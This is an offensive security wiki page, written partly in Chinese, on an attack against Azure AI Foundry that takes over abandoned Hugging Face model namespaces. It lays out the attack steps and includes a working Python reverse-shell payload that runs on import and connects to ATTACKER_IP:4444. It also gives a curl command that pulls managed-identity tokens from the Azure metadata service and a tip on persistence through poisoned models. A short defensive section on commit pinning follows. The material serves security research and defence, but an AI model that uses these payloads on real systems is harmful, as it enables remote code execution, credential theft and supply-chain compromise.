# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 场景

- Azure AI Foundry Model Catalog 包含许多可一键部署的 Hugging Face (HF) 模型。
- HF model identifiers are Author/ModelName。如果某个 HF author/org 被删除，任何人都可以重新注册该 author 并在相同的 legacy path 发布具有相同 ModelName 的模型。
- 仅按名称拉取的 pipelines 和 catalogs（不做 commit pinning/integrity）会解析到攻击者控制的 repos。当 Azure 部署该模型时，loader 代码可能在 endpoint 环境执行，从而以该 endpoint 的权限获得 RCE。

Common HF takeover cases:
- Ownership deletion: 旧路径 404，直到 takeover。
- Ownership transfer: 在旧 author 存在时旧路径会 307 到新 author。如果旧 author 后来被删除并重新注册，重定向会失效，攻击者的 repo 将在 legacy path 提供服务。

## 识别可重用的命名空间 (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## 针对 Azure AI Foundry 的端到端攻击流程

1) 在 Model Catalog 中，查找在 HF 上原始作者被删除或转移（旧作者被移除）的 HF models。  
2) 在 HF 上重新注册被遗弃的作者并重新创建 ModelName。  
3) 发布一个包含在 import 时执行或需要 trust_remote_code=True 的 loader 代码的恶意 repo。  
4) 从 Azure AI Foundry 部署旧的 Author/ModelName。平台会拉取攻击者的 repo；loader 在 Azure endpoint 的 container/VM 内执行，从而以 endpoint 权限实现 RCE。

示例 payload 片段，在 import 时执行（仅作演示）：
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
注意
- AI Foundry deployments that integrate HF typically clone and import repo modules referenced by the model’s config (e.g., auto_map), which can trigger code execution. Some paths require trust_remote_code=True.
- Access usually matches the endpoint’s managed identity/service principal permissions. Treat it as an initial access foothold for data access and lateral movement within Azure.

## 后利用提示 (Azure Endpoint)

- 枚举环境变量和 MSI 端点以获取令牌：
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- 使用获取到的 token 检查已挂载的存储、模型工件，以及可达的 Azure services。
- 如果平台会从 HF 重新拉取，考虑通过留置被投毒的模型工件以实现 persistence。

## 针对 Azure AI Foundry 用户的防御性指南

- 从 HF 加载时按 commit 固定模型：
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 将经过审查的 HF 模型镜像到受信任的内部注册表，并从那里部署。
- 持续扫描代码库和默认值/文档字符串/笔记本，以查找被硬编码的 Author/ModelName（被删除/已转移）；更新或固定（pin）。
- 在部署之前验证作者存在性和模型来源。

## 识别启发式 (HTTP)

- 已删除作者：作者页面 404；旧的模型路径在接管之前返回 404。
- 已转移的模型：在旧作者仍存在时，旧的模型路径会 307 重定向到新作者；如果旧作者后来被删除并重新注册，旧路径会提供攻击者内容。
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 交叉引用

- 请参阅更广泛的方法论和供应链注意事项：

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考资料

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
